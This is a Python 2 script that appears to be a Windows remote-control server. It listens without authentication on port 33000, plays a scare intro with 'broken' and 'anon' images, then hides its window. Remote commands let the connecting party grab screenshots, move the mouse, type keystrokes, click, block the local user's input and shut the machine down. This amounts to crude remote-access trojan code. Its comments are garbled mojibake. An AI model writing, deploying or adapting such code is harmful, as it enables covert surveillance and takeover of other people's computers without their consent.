import wx
from ctypes import *
import socket
import datetime
from random import randint
import os
from threading import Thread
import win32api, win32con
import time
from PIL import ImageGrab
import win32com.client
import string
import pywintypes

def piltoimage(pil, alpha=True): #Converts PIL to IMG 
        image = wx.EmptyImage(1920, 1080)
        new_image = pil.convert('RGB')
        data = new_image.tostring()
        image.SetData(data)
        return image
    


class Server(wx.Frame):
    
    def __init__(self, parent, title):
        super(Server, self).__init__(parent, title=title)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.shell = win32com.client.Dispatch("WScript.Shell")
        
        self.s.bind(('0.0.0.0', 33000))#----------------
        self.s.listen(1)
        print "wait for connection"
        self.conn, address = self.s.accept()
        print "connected"
        
        self.SetBackgroundColour((0, 0, 0)) #����� ��� ���
        self.Maximize(True) #��� ���
        self.Show()
        
        self.music=wx.Sound("control.wav") #����� ������ �����
        self.music.Play(wx.SOUND_ASYNC)
        self.caps=False
        
        self.anon = wx.StaticBitmap(self, pos=(0,0)) #����� ������ ������ ��������
        self.broken = wx.StaticBitmap(self, pos=(0,0))
        
        self.t2=Thread(target = self.intro) #����� Thread ����� �� ������
        self.t2.start()
        
        self.t1=Thread(target = self.recv) #����� Thread �� ������ ������
        self.t1.start()


    def intro (self): #���� �� ������
        time.sleep(23.8)
        self.w="broken.jpg"
        self.broken.SetBitmap(wx.Bitmap(self.w))
        time.sleep(1)
        time.sleep(0.75)
        self.w="background.jpg"
        self.anon.SetBitmap(wx.Bitmap(self.w))
        time.sleep(0.5)
        self.music.Stop()
        self.Hide()
 
                
    def recv(self): #������ ������
        
        while True:
            
            self.data = self.conn.recv(10024) #����� ����� ���� ������
            
            if "screenshot" in self.data: #�� ���� ����� �� ����� ���
                pilImage = ImageGrab.grab() #���� ���
                s = (piltoimage(pilImage)).GetData() #����� �� ������ �������
                self.conn.send(s)
                
            else:
                
                if self.data[0:6]=="mouse:": #���� ����� �� ����� �� �����
                    a=self.data.split("?") #���� ����� �� ������ ���� �� �����
                    n=0
                    while n<len (a):
                        pos=a[n].split(":")
                        if len (pos)==3:
                            x=int(int((pos[1])))
                            y=int(int((pos[2])))
                            win32api.SetCursorPos((int(x),int(1.039*y))) #����� �� ������ ���� �� �����
                        n=n+1
                        
                else:
                    
                    if 'keyboard:' in self.data: #���� ����� �� ����� ������
                        a=self.data.split(":") #���� �� ���� �����
                        b=a[1].split("?")[0]
                        self.SetFocus()
                        if b=='311': #����� �� CAPSLOCK
                            if self.caps==False:
                                self.caps=True
                            else:
                                self.caps=False
                        try: #���� ����� �� ����
                            if self.caps==False:
                                self.shell.SendKeys((chr(int(b))).lower())
                            else:
                                self.shell.SendKeys(chr(int(b)))
                        except:
                            " "
    
                if 'doubleClick' in self.data: #���� ����� �� ����� �����
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    
                if 'leftDown' in self.data: #���� ����� ����� ������ ����
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    
                if 'leftUp' in self.data: #���� ����� ����� ������ ������
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    
                if 'lock' in self.data: #���� ����� �� ����� �����
                    ok=windll.user32.BlockInput(True)
                    
                if 'unlock' in self.data: #���� ����� �� ����� �����
                    ok=windll.user32.BlockInput(False)
                    
                if 'shutDown' in self.data: #���� ����� �� ���� �����
                    os.system('shutdown -s')

                if 'exit' in self.data:
                    self.s.close()

   
                


if __name__ == '__main__':
 
	app = wx.App()
	Server(None, title='Center')
	app.MainLoop()
